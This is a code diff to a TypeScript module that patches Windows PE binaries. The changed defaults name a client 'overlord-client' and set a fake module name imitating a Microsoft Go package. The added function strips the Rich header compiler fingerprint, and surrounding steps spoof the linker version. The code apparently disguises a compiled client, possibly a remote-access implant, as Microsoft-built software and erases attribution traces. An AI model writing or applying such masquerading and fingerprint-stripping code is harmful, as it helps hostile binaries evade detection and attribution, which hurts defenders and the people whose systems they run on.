@@ -18,7 +18,7 @@ const DEFAULT_OPTS: Required<PePatchOptions> = {
   patchGoVersion: true,
   patchModulePath: true,
   moduleName: "overlord-client",
-  fakeModuleName: "microsoft/windows",
+  fakeModuleName: "github.com/microsoft/go-winio",
   fixChecksum: true,
 };
 
@@ -35,6 +35,9 @@ export function patchPe(input: Buffer, opts: PePatchOptions = {}): Buffer {
   if (buf.readUInt32LE(eLfanew) !== 0x00004550) return buf; // not PE\0\0
 
   const optHdrOff = eLfanew + 24; // start of Optional Header
+
+  // ── 0. Remove Rich header (linker/compiler version fingerprint) ─────────────
+  removeRichHeader(buf, eLfanew);
 
   // ── 1. Patch linker version → VS2019 (14.29) ─────────────────────────────
   if (o.patchLinkerVersion && optHdrOff + 4 <= buf.length) {
@@ -101,6 +104,39 @@ export function patchPe(input: Buffer, opts: PePatchOptions = {}): Buffer {
   }
 
   return buf;
+}
+
+/**
+ * Remove the Rich header (PE linker/compiler fingerprint).
+ * The Rich header sits between the DOS stub and the PE header.
+ * Layout: [DanS^key][zeros^key x3][entries^key...][Rich][key]
+ * We locate "Rich" (0x52696368), extract the XOR key, find the DanS marker
+ * scanning backwards, then zero the whole block.
+ */
+function removeRichHeader(buf: Buffer, eLfanew: number): void {
+  const richSig = 0x52696368; // "Rich"
+  let richOffset = -1;
+  for (let i = 0x40; i <= eLfanew - 8; i++) {
+    if (buf.readUInt32LE(i) === richSig) {
+      richOffset = i;
+      break;
+    }
+  }
+  if (richOffset === -1) return;
+
+  const xorKey = buf.readUInt32LE(richOffset + 4);
+  const dansMasked = 0x536e6144 ^ xorKey; // "DanS" XOR key
+
+  let dansOffset = -1;
+  for (let i = richOffset - 4; i >= 0x40; i -= 4) {
+    if (buf.readUInt32LE(i) === dansMasked) {
+      dansOffset = i;
+      break;
+    }
+  }
+  if (dansOffset === -1) return;
+
+  buf.fill(0, dansOffset, richOffset + 8);
 }
 
 /**
